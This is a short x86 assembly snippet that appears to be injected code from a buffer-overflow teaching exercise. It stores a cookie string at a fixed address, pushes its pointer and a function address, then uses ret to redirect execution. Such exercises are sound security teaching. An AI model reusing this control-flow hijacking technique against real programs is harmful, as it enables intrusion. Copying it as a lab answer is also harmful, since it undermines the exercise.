movl $0x804d2e8, %ecx
movl $0x35313134, (%ecx)
movl $0x46313336, 0x4(%ecx)
pushl %ecx
subl $0x4, %esp
pushl $0x0804954d
ret